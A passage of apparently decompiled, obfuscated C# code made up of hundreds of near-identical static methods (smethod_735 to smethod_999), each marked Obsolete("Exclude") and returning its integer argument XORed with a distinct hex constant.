	[Obsolete("Exclude")]
	public static int smethod_735(int int_4)
	{
		return int_4 ^ 0x54CC0D75;
	}

	[Obsolete("Exclude")]
	public static int smethod_736(int int_4)
	{
		return int_4 ^ 0x345759BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_737(int int_4)
	{
		return int_4 ^ 0x3D793D08;
	}

	[Obsolete("Exclude")]
	public static int smethod_738(int int_4)
	{
		return int_4 ^ 0x2E0671BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_739(int int_4)
	{
		return int_4 ^ 0x12FB395B;
	}

	[Obsolete("Exclude")]
	public static int smethod_740(int int_4)
	{
		return int_4 ^ 0x433FCD3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_741(int int_4)
	{
		return int_4 ^ 0x10659E82;
	}

	[Obsolete("Exclude")]
	public static int smethod_742(int int_4)
	{
		return int_4 ^ 0x23B5338B;
	}

	[Obsolete("Exclude")]
	public static int smethod_743(int int_4)
	{
		return int_4 ^ 0x29C979C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_744(int int_4)
	{
		return int_4 ^ 0x62DB0237;
	}

	[Obsolete("Exclude")]
	public static int smethod_745(int int_4)
	{
		return int_4 ^ 0x639678B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_746(int int_4)
	{
		return int_4 ^ 0x268D2BB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_747(int int_4)
	{
		return int_4 ^ 0x5F4D64D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_748(int int_4)
	{
		return int_4 ^ 0x7E04942E;
	}

	[Obsolete("Exclude")]
	public static int smethod_749(int int_4)
	{
		return int_4 ^ 0x27ED1A67;
	}

	[Obsolete("Exclude")]
	public static int smethod_750(int int_4)
	{
		return int_4 ^ 0x667243A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_751(int int_4)
	{
		return int_4 ^ 0x20122F91;
	}

	[Obsolete("Exclude")]
	public static int smethod_752(int int_4)
	{
		return int_4 ^ 0x3765B38A;
	}

	[Obsolete("Exclude")]
	public static int smethod_753(int int_4)
	{
		return int_4 ^ 0x69AFECF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_754(int int_4)
	{
		return int_4 ^ 0x3D18279D;
	}

	[Obsolete("Exclude")]
	public static int smethod_755(int int_4)
	{
		return int_4 ^ 0x198F43DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_756(int int_4)
	{
		return int_4 ^ 0x166BE90E;
	}

	[Obsolete("Exclude")]
	public static int smethod_757(int int_4)
	{
		return int_4 ^ 0x21ACC535;
	}

	[Obsolete("Exclude")]
	public static int smethod_758(int int_4)
	{
		return int_4 ^ 0x7F838340;
	}

	[Obsolete("Exclude")]
	public static int smethod_759(int int_4)
	{
		return int_4 ^ 0x582B9490;
	}

	[Obsolete("Exclude")]
	public static int smethod_760(int int_4)
	{
		return int_4 ^ 0xFC7D1AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_761(int int_4)
	{
		return int_4 ^ 0x47E95D97;
	}

	[Obsolete("Exclude")]
	public static int smethod_762(int int_4)
	{
		return int_4 ^ 0x70E711E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_763(int int_4)
	{
		return int_4 ^ 0x7B7F469B;
	}

	[Obsolete("Exclude")]
	public static int smethod_764(int int_4)
	{
		return int_4 ^ 0x6C77EC98;
	}

	[Obsolete("Exclude")]
	public static int smethod_765(int int_4)
	{
		return int_4 ^ 0x2B559DE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_766(int int_4)
	{
		return int_4 ^ 0x727B8AB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_767(int int_4)
	{
		return int_4 ^ 0x7EF83C26;
	}

	[Obsolete("Exclude")]
	public static int smethod_768(int int_4)
	{
		return int_4 ^ 0x4E5FF3CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_769(int int_4)
	{
		return int_4 ^ 0x3AB5AD92;
	}

	[Obsolete("Exclude")]
	public static int smethod_770(int int_4)
	{
		return int_4 ^ 0x7E0BB646;
	}

	[Obsolete("Exclude")]
	public static int smethod_771(int int_4)
	{
		return int_4 ^ 0x67C20F8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_772(int int_4)
	{
		return int_4 ^ 0x58A16949;
	}

	[Obsolete("Exclude")]
	public static int smethod_773(int int_4)
	{
		return int_4 ^ 0x78903528;
	}

	[Obsolete("Exclude")]
	public static int smethod_774(int int_4)
	{
		return int_4 ^ 0x15E7D60D;
	}

	[Obsolete("Exclude")]
	public static int smethod_775(int int_4)
	{
		return int_4 ^ 0x48626233;
	}

	[Obsolete("Exclude")]
	public static int smethod_776(int int_4)
	{
		return int_4 ^ 0x1B116A88;
	}

	[Obsolete("Exclude")]
	public static int smethod_777(int int_4)
	{
		return int_4 ^ 0x35E31F46;
	}

	[Obsolete("Exclude")]
	public static int smethod_778(int int_4)
	{
		return int_4 ^ 0x6E825CFF;
	}

	[Obsolete("Exclude")]
	public static int smethod_779(int int_4)
	{
		return int_4 ^ 0x42BED0C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_780(int int_4)
	{
		return int_4 ^ 0x4D36AC14;
	}

	[Obsolete("Exclude")]
	public static int smethod_781(int int_4)
	{
		return int_4 ^ 0x33FA55BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_782(int int_4)
	{
		return int_4 ^ 0x7F4A36E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_783(int int_4)
	{
		return int_4 ^ 0x719DC701;
	}

	[Obsolete("Exclude")]
	public static int smethod_784(int int_4)
	{
		return int_4 ^ 0x8EC5BA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_785(int int_4)
	{
		return int_4 ^ 0x4C71C2AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_786(int int_4)
	{
		return int_4 ^ 0x4687D58C;
	}

	[Obsolete("Exclude")]
	public static int smethod_787(int int_4)
	{
		return int_4 ^ 0x70036B7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_788(int int_4)
	{
		return int_4 ^ 0x2108F07C;
	}

	[Obsolete("Exclude")]
	public static int smethod_789(int int_4)
	{
		return int_4 ^ 0x3C69E9AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_790(int int_4)
	{
		return int_4 ^ 0x2D22F07A;
	}

	[Obsolete("Exclude")]
	public static int smethod_791(int int_4)
	{
		return int_4 ^ 0x753CD0E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_792(int int_4)
	{
		return int_4 ^ 0x40E6B2AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_793(int int_4)
	{
		return int_4 ^ 0x5D4FABD4;
	}

	[Obsolete("Exclude")]
	public static int smethod_794(int int_4)
	{
		return int_4 ^ 0x6BE4025E;
	}

	[Obsolete("Exclude")]
	public static int smethod_795(int int_4)
	{
		return int_4 ^ 0x741DDE23;
	}

	[Obsolete("Exclude")]
	public static int smethod_796(int int_4)
	{
		return int_4 ^ 0x1DED4BB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_797(int int_4)
	{
		return int_4 ^ 0x37669A09;
	}

	[Obsolete("Exclude")]
	public static int smethod_798(int int_4)
	{
		return int_4 ^ 0x253B3F9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_799(int int_4)
	{
		return int_4 ^ 0x7213AD1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_800(int int_4)
	{
		return int_4 ^ 0x4F901430;
	}

	[Obsolete("Exclude")]
	public static int smethod_801(int int_4)
	{
		return int_4 ^ 0x4014F70B;
	}

	[Obsolete("Exclude")]
	public static int smethod_802(int int_4)
	{
		return int_4 ^ 0x3BAB3D32;
	}

	[Obsolete("Exclude")]
	public static int smethod_803(int int_4)
	{
		return int_4 ^ 0x4F1B731D;
	}

	[Obsolete("Exclude")]
	public static int smethod_804(int int_4)
	{
		return int_4 ^ 0x5A60BCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_805(int int_4)
	{
		return int_4 ^ 0x45E905B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_806(int int_4)
	{
		return int_4 ^ 0x64542419;
	}

	[Obsolete("Exclude")]
	public static int smethod_807(int int_4)
	{
		return int_4 ^ 0x1C87B6F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_808(int int_4)
	{
		return int_4 ^ 0x16EAFA85;
	}

	[Obsolete("Exclude")]
	public static int smethod_809(int int_4)
	{
		return int_4 ^ 0x3D5179C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_810(int int_4)
	{
		return int_4 ^ 0x241DF8C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_811(int int_4)
	{
		return int_4 ^ 0x171C8308;
	}

	[Obsolete("Exclude")]
	public static int smethod_812(int int_4)
	{
		return int_4 ^ 0x747455EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_813(int int_4)
	{
		return int_4 ^ 0x50C7A71F;
	}

	[Obsolete("Exclude")]
	public static int smethod_814(int int_4)
	{
		return int_4 ^ 0x153E0C11;
	}

	[Obsolete("Exclude")]
	public static int smethod_815(int int_4)
	{
		return int_4 ^ 0x446A31C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_816(int int_4)
	{
		return int_4 ^ 0x6FCC41CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_817(int int_4)
	{
		return int_4 ^ 0x64130F9B;
	}

	[Obsolete("Exclude")]
	public static int smethod_818(int int_4)
	{
		return int_4 ^ 0x759C4A1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_819(int int_4)
	{
		return int_4 ^ 0x3339DE9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_820(int int_4)
	{
		return int_4 ^ 0x63B1121F;
	}

	[Obsolete("Exclude")]
	public static int smethod_821(int int_4)
	{
		return int_4 ^ 0x136560A;
	}

	[Obsolete("Exclude")]
	public static int smethod_822(int int_4)
	{
		return int_4 ^ 0x6DCF2532;
	}

	[Obsolete("Exclude")]
	public static int smethod_823(int int_4)
	{
		return int_4 ^ 0x2F7583AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_824(int int_4)
	{
		return int_4 ^ 0x32C8C896;
	}

	[Obsolete("Exclude")]
	public static int smethod_825(int int_4)
	{
		return int_4 ^ 0x5719F090;
	}

	[Obsolete("Exclude")]
	public static int smethod_826(int int_4)
	{
		return int_4 ^ 0x1954FA37;
	}

	[Obsolete("Exclude")]
	public static int smethod_827(int int_4)
	{
		return int_4 ^ 0x73459AA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_828(int int_4)
	{
		return int_4 ^ 0x2D36C116;
	}

	[Obsolete("Exclude")]
	public static int smethod_829(int int_4)
	{
		return int_4 ^ 0x8AF6B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_830(int int_4)
	{
		return int_4 ^ 0x43CE7F25;
	}

	[Obsolete("Exclude")]
	public static int smethod_831(int int_4)
	{
		return int_4 ^ 0x51A57CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_832(int int_4)
	{
		return int_4 ^ 0x67F06C5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_833(int int_4)
	{
		return int_4 ^ 0x6DF78BB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_834(int int_4)
	{
		return int_4 ^ 0x7603DEC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_835(int int_4)
	{
		return int_4 ^ 0x4256775E;
	}

	[Obsolete("Exclude")]
	public static int smethod_836(int int_4)
	{
		return int_4 ^ 0x2D19C2C2;
	}

	[Obsolete("Exclude")]
	public static int smethod_837(int int_4)
	{
		return int_4 ^ 0x36E34B6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_838(int int_4)
	{
		return int_4 ^ 0x4A1106F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_839(int int_4)
	{
		return int_4 ^ 0xC6BD629;
	}

	[Obsolete("Exclude")]
	public static int smethod_840(int int_4)
	{
		return int_4 ^ 0x12B3113F;
	}

	[Obsolete("Exclude")]
	public static int smethod_841(int int_4)
	{
		return int_4 ^ 0x38D1D195;
	}

	[Obsolete("Exclude")]
	public static int smethod_842(int int_4)
	{
		return int_4 ^ 0x3F1A3F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_843(int int_4)
	{
		return int_4 ^ 0x1F089AD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_844(int int_4)
	{
		return int_4 ^ 0x1876F3C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_845(int int_4)
	{
		return int_4 ^ 0x34A3CB7A;
	}

	[Obsolete("Exclude")]
	public static int smethod_846(int int_4)
	{
		return int_4 ^ 0x32AC2C63;
	}

	[Obsolete("Exclude")]
	public static int smethod_847(int int_4)
	{
		return int_4 ^ 0x3C2F93AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_848(int int_4)
	{
		return int_4 ^ 0x681C45CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_849(int int_4)
	{
		return int_4 ^ 0x1F080D31;
	}

	[Obsolete("Exclude")]
	public static int smethod_850(int int_4)
	{
		return int_4 ^ 0x3B59C81E;
	}

	[Obsolete("Exclude")]
	public static int smethod_851(int int_4)
	{
		return int_4 ^ 0x4275D6CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_852(int int_4)
	{
		return int_4 ^ 0x5D723F9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_853(int int_4)
	{
		return int_4 ^ 0xEFB2ABE;
	}

	[Obsolete("Exclude")]
	public static int smethod_854(int int_4)
	{
		return int_4 ^ 0x6619D76F;
	}

	[Obsolete("Exclude")]
	public static int smethod_855(int int_4)
	{
		return int_4 ^ 0x73128623;
	}

	[Obsolete("Exclude")]
	public static int smethod_856(int int_4)
	{
		return int_4 ^ 0x69E014E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_857(int int_4)
	{
		return int_4 ^ 0x1D1280B3;
	}

	[Obsolete("Exclude")]
	public static int smethod_858(int int_4)
	{
		return int_4 ^ 0x6E48A326;
	}

	[Obsolete("Exclude")]
	public static int smethod_859(int int_4)
	{
		return int_4 ^ 0x3FD956FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_860(int int_4)
	{
		return int_4 ^ 0x1832F643;
	}

	[Obsolete("Exclude")]
	public static int smethod_861(int int_4)
	{
		return int_4 ^ 0x1E77DCA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_862(int int_4)
	{
		return int_4 ^ 0x42152B48;
	}

	[Obsolete("Exclude")]
	public static int smethod_863(int int_4)
	{
		return int_4 ^ 0x6FD40ED4;
	}

	[Obsolete("Exclude")]
	public static int smethod_864(int int_4)
	{
		return int_4 ^ 0x402F5367;
	}

	[Obsolete("Exclude")]
	public static int smethod_865(int int_4)
	{
		return int_4 ^ 0x72617347;
	}

	[Obsolete("Exclude")]
	public static int smethod_866(int int_4)
	{
		return int_4 ^ 0x20C7E2BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_867(int int_4)
	{
		return int_4 ^ 0x38BF708;
	}

	[Obsolete("Exclude")]
	public static int smethod_868(int int_4)
	{
		return int_4 ^ 0x2E003314;
	}

	[Obsolete("Exclude")]
	public static int smethod_869(int int_4)
	{
		return int_4 ^ 0x4CE1B90F;
	}

	[Obsolete("Exclude")]
	public static int smethod_870(int int_4)
	{
		return int_4 ^ 0x5F387682;
	}

	[Obsolete("Exclude")]
	public static int smethod_871(int int_4)
	{
		return int_4 ^ 0x8E0DA23;
	}

	[Obsolete("Exclude")]
	public static int smethod_872(int int_4)
	{
		return int_4 ^ 0x253A65D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_873(int int_4)
	{
		return int_4 ^ 0x26442C94;
	}

	[Obsolete("Exclude")]
	public static int smethod_874(int int_4)
	{
		return int_4 ^ 0x1D2CEF8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_875(int int_4)
	{
		return int_4 ^ 0x59A0948D;
	}

	[Obsolete("Exclude")]
	public static int smethod_876(int int_4)
	{
		return int_4 ^ 0x7CC75899;
	}

	[Obsolete("Exclude")]
	public static int smethod_877(int int_4)
	{
		return int_4 ^ 0x634AFB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_878(int int_4)
	{
		return int_4 ^ 0x3508291D;
	}

	[Obsolete("Exclude")]
	public static int smethod_879(int int_4)
	{
		return int_4 ^ 0x5EAB46C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_880(int int_4)
	{
		return int_4 ^ 0x300D5DC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_881(int int_4)
	{
		return int_4 ^ 0x3F7BE73E;
	}

	[Obsolete("Exclude")]
	public static int smethod_882(int int_4)
	{
		return int_4 ^ 0x34B606BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_883(int int_4)
	{
		return int_4 ^ 0x522E701B;
	}

	[Obsolete("Exclude")]
	public static int smethod_884(int int_4)
	{
		return int_4 ^ 0x258FAC0;
	}

	[Obsolete("Exclude")]
	public static int smethod_885(int int_4)
	{
		return int_4 ^ 0x6AF16FC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_886(int int_4)
	{
		return int_4 ^ 0x502792EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_887(int int_4)
	{
		return int_4 ^ 0x54A2C4C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_888(int int_4)
	{
		return int_4 ^ 0xC5EB75B;
	}

	[Obsolete("Exclude")]
	public static int smethod_889(int int_4)
	{
		return int_4 ^ 0x186420A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_890(int int_4)
	{
		return int_4 ^ 0x3E8C3FE6;
	}

	[Obsolete("Exclude")]
	public static int smethod_891(int int_4)
	{
		return int_4 ^ 0x4553F61D;
	}

	[Obsolete("Exclude")]
	public static int smethod_892(int int_4)
	{
		return int_4 ^ 0x5C7084A;
	}

	[Obsolete("Exclude")]
	public static int smethod_893(int int_4)
	{
		return int_4 ^ 0x9DAE502;
	}

	[Obsolete("Exclude")]
	public static int smethod_894(int int_4)
	{
		return int_4 ^ 0x3A77353D;
	}

	[Obsolete("Exclude")]
	public static int smethod_895(int int_4)
	{
		return int_4 ^ 0x5A6A7B8;
	}

	[Obsolete("Exclude")]
	public static int smethod_896(int int_4)
	{
		return int_4 ^ 0x1E45051F;
	}

	[Obsolete("Exclude")]
	public static int smethod_897(int int_4)
	{
		return int_4 ^ 0x6A80860D;
	}

	[Obsolete("Exclude")]
	public static int smethod_898(int int_4)
	{
		return int_4 ^ 0x59CA07E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_899(int int_4)
	{
		return int_4 ^ 0x66C49B20;
	}

	[Obsolete("Exclude")]
	public static int smethod_900(int int_4)
	{
		return int_4 ^ 0xC070DCD;
	}

	[Obsolete("Exclude")]
	public static int smethod_901(int int_4)
	{
		return int_4 ^ 0x34EEECC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_902(int int_4)
	{
		return int_4 ^ 0x521AF1D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_903(int int_4)
	{
		return int_4 ^ 0x188496E;
	}

	[Obsolete("Exclude")]
	public static int smethod_904(int int_4)
	{
		return int_4 ^ 0x34921335;
	}

	[Obsolete("Exclude")]
	public static int smethod_905(int int_4)
	{
		return int_4 ^ 0x3AD3FD71;
	}

	[Obsolete("Exclude")]
	public static int smethod_906(int int_4)
	{
		return int_4 ^ 0x7F715ADA;
	}

	[Obsolete("Exclude")]
	public static int smethod_907(int int_4)
	{
		return int_4 ^ 0x142E2564;
	}

	[Obsolete("Exclude")]
	public static int smethod_908(int int_4)
	{
		return int_4 ^ 0x45303B8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_909(int int_4)
	{
		return int_4 ^ 0xC61DAE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_910(int int_4)
	{
		return int_4 ^ 0x1466CC4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_911(int int_4)
	{
		return int_4 ^ 0x6C55F5F3;
	}

	[Obsolete("Exclude")]
	public static int smethod_912(int int_4)
	{
		return int_4 ^ 0x3AA6906;
	}

	[Obsolete("Exclude")]
	public static int smethod_913(int int_4)
	{
		return int_4 ^ 0x2C417961;
	}

	[Obsolete("Exclude")]
	public static int smethod_914(int int_4)
	{
		return int_4 ^ 0x6C5F562C;
	}

	[Obsolete("Exclude")]
	public static int smethod_915(int int_4)
	{
		return int_4 ^ 0x6F3F7AA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_916(int int_4)
	{
		return int_4 ^ 0x45D50B64;
	}

	[Obsolete("Exclude")]
	public static int smethod_917(int int_4)
	{
		return int_4 ^ 0x5DEDE40D;
	}

	[Obsolete("Exclude")]
	public static int smethod_918(int int_4)
	{
		return int_4 ^ 0x2F8FB0E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_919(int int_4)
	{
		return int_4 ^ 0xFAC53BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_920(int int_4)
	{
		return int_4 ^ 0x1E996417;
	}

	[Obsolete("Exclude")]
	public static int smethod_921(int int_4)
	{
		return int_4 ^ 0x587F6895;
	}

	[Obsolete("Exclude")]
	public static int smethod_922(int int_4)
	{
		return int_4 ^ 0x6571EF02;
	}

	[Obsolete("Exclude")]
	public static int smethod_923(int int_4)
	{
		return int_4 ^ 0x1A9D65B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_924(int int_4)
	{
		return int_4 ^ 0x24BE8422;
	}

	[Obsolete("Exclude")]
	public static int smethod_925(int int_4)
	{
		return int_4 ^ 0x3F41EC90;
	}

	[Obsolete("Exclude")]
	public static int smethod_926(int int_4)
	{
		return int_4 ^ 0x5A2D2CD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_927(int int_4)
	{
		return int_4 ^ 0x63579BED;
	}

	[Obsolete("Exclude")]
	public static int smethod_928(int int_4)
	{
		return int_4 ^ 0x198BBEDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_929(int int_4)
	{
		return int_4 ^ 0x2561579;
	}

	[Obsolete("Exclude")]
	public static int smethod_930(int int_4)
	{
		return int_4 ^ 0x7E13DB8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_931(int int_4)
	{
		return int_4 ^ 0x246AD28E;
	}

	[Obsolete("Exclude")]
	public static int smethod_932(int int_4)
	{
		return int_4 ^ 0x44E33671;
	}

	[Obsolete("Exclude")]
	public static int smethod_933(int int_4)
	{
		return int_4 ^ 0x7BABAA6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_934(int int_4)
	{
		return int_4 ^ 0x4D284DB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_935(int int_4)
	{
		return int_4 ^ 0x5C8692F;
	}

	[Obsolete("Exclude")]
	public static int smethod_936(int int_4)
	{
		return int_4 ^ 0x4E31F5D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_937(int int_4)
	{
		return int_4 ^ 0x4AE51AE0;
	}

	[Obsolete("Exclude")]
	public static int smethod_938(int int_4)
	{
		return int_4 ^ 0x4BFE4159;
	}

	[Obsolete("Exclude")]
	public static int smethod_939(int int_4)
	{
		return int_4 ^ 0x15FB5549;
	}

	[Obsolete("Exclude")]
	public static int smethod_940(int int_4)
	{
		return int_4 ^ 0x6B12D80A;
	}

	[Obsolete("Exclude")]
	public static int smethod_941(int int_4)
	{
		return int_4 ^ 0x13EFD39B;
	}

	[Obsolete("Exclude")]
	public static int smethod_942(int int_4)
	{
		return int_4 ^ 0x7EA78733;
	}

	[Obsolete("Exclude")]
	public static int smethod_943(int int_4)
	{
		return int_4 ^ 0x1990F05C;
	}

	[Obsolete("Exclude")]
	public static int smethod_944(int int_4)
	{
		return int_4 ^ 0x2621EB62;
	}

	[Obsolete("Exclude")]
	public static int smethod_945(int int_4)
	{
		return int_4 ^ 0x573F0B98;
	}

	[Obsolete("Exclude")]
	public static int smethod_946(int int_4)
	{
		return int_4 ^ 0x28617FAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_947(int int_4)
	{
		return int_4 ^ 0x596380C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_948(int int_4)
	{
		return int_4 ^ 0x1F44BB2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_949(int int_4)
	{
		return int_4 ^ 0x6B2A1E9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_950(int int_4)
	{
		return int_4 ^ 0x529E6A28;
	}

	[Obsolete("Exclude")]
	public static int smethod_951(int int_4)
	{
		return int_4 ^ 0x4AC13115;
	}

	[Obsolete("Exclude")]
	public static int smethod_952(int int_4)
	{
		return int_4 ^ 0x441925A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_953(int int_4)
	{
		return int_4 ^ 0x3C223746;
	}

	[Obsolete("Exclude")]
	public static int smethod_954(int int_4)
	{
		return int_4 ^ 0x374337C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_955(int int_4)
	{
		return int_4 ^ 0x3A701D39;
	}

	[Obsolete("Exclude")]
	public static int smethod_956(int int_4)
	{
		return int_4 ^ 0x9FCAD2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_957(int int_4)
	{
		return int_4 ^ 0x5FCB1B94;
	}

	[Obsolete("Exclude")]
	public static int smethod_958(int int_4)
	{
		return int_4 ^ 0x42AC8CE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_959(int int_4)
	{
		return int_4 ^ 0x638BCDCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_960(int int_4)
	{
		return int_4 ^ 0x3965CA79;
	}

	[Obsolete("Exclude")]
	public static int smethod_961(int int_4)
	{
		return int_4 ^ 0x316EC906;
	}

	[Obsolete("Exclude")]
	public static int smethod_962(int int_4)
	{
		return int_4 ^ 0x46A7E0E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_963(int int_4)
	{
		return int_4 ^ 0x596BF5BE;
	}

	[Obsolete("Exclude")]
	public static int smethod_964(int int_4)
	{
		return int_4 ^ 0x3E414A2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_965(int int_4)
	{
		return int_4 ^ 0x768B341E;
	}

	[Obsolete("Exclude")]
	public static int smethod_966(int int_4)
	{
		return int_4 ^ 0xAF40F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_967(int int_4)
	{
		return int_4 ^ 0x7E8193F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_968(int int_4)
	{
		return int_4 ^ 0x37A5517F;
	}

	[Obsolete("Exclude")]
	public static int smethod_969(int int_4)
	{
		return int_4 ^ 0xD651191;
	}

	[Obsolete("Exclude")]
	public static int smethod_970(int int_4)
	{
		return int_4 ^ 0x415E8F4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_971(int int_4)
	{
		return int_4 ^ 0x3A0FF9CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_972(int int_4)
	{
		return int_4 ^ 0x1E0CDF72;
	}

	[Obsolete("Exclude")]
	public static int smethod_973(int int_4)
	{
		return int_4 ^ 0x2901BAAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_974(int int_4)
	{
		return int_4 ^ 0x43FA40EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_975(int int_4)
	{
		return int_4 ^ 0x31F68723;
	}

	[Obsolete("Exclude")]
	public static int smethod_976(int int_4)
	{
		return int_4 ^ 0x42B002F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_977(int int_4)
	{
		return int_4 ^ 0x34387233;
	}

	[Obsolete("Exclude")]
	public static int smethod_978(int int_4)
	{
		return int_4 ^ 0x28274307;
	}

	[Obsolete("Exclude")]
	public static int smethod_979(int int_4)
	{
		return int_4 ^ 0x47A4E85;
	}

	[Obsolete("Exclude")]
	public static int smethod_980(int int_4)
	{
		return int_4 ^ 0xBBD6528;
	}

	[Obsolete("Exclude")]
	public static int smethod_981(int int_4)
	{
		return int_4 ^ 0x43FBCC4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_982(int int_4)
	{
		return int_4 ^ 0x46DCCB5E;
	}

	[Obsolete("Exclude")]
	public static int smethod_983(int int_4)
	{
		return int_4 ^ 0x6B6CC561;
	}

	[Obsolete("Exclude")]
	public static int smethod_984(int int_4)
	{
		return int_4 ^ 0x5F12F5E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_985(int int_4)
	{
		return int_4 ^ 0x6323CDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_986(int int_4)
	{
		return int_4 ^ 0x1E09E8BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_987(int int_4)
	{
		return int_4 ^ 0x32ED29A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_988(int int_4)
	{
		return int_4 ^ 0x76B34096;
	}

	[Obsolete("Exclude")]
	public static int smethod_989(int int_4)
	{
		return int_4 ^ 0x24319531;
	}

	[Obsolete("Exclude")]
	public static int smethod_990(int int_4)
	{
		return int_4 ^ 0x3B05F140;
	}

	[Obsolete("Exclude")]
	public static int smethod_991(int int_4)
	{
		return int_4 ^ 0x69493514;
	}

	[Obsolete("Exclude")]
	public static int smethod_992(int int_4)
	{
		return int_4 ^ 0x587BC9E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_993(int int_4)
	{
		return int_4 ^ 0x1EB89131;
	}

	[Obsolete("Exclude")]
	public static int smethod_994(int int_4)
	{
		return int_4 ^ 0x48AFDF02;
	}

	[Obsolete("Exclude")]
	public static int smethod_995(int int_4)
	{
		return int_4 ^ 0x1C2FEE52;
	}

	[Obsolete("Exclude")]
	public static int smethod_996(int int_4)
	{
		return int_4 ^ 0x47A1E1E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_997(int int_4)
	{
		return int_4 ^ 0x17AC2603;
	}

	[Obsolete("Exclude")]
	public static int smethod_998(int int_4)
	{
		return int_4 ^ 0x32E50D2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_999(int int_4)
	{
		return int_4 ^ 0x5DD4D196;
	}

	[Obsolete("Exclude")]
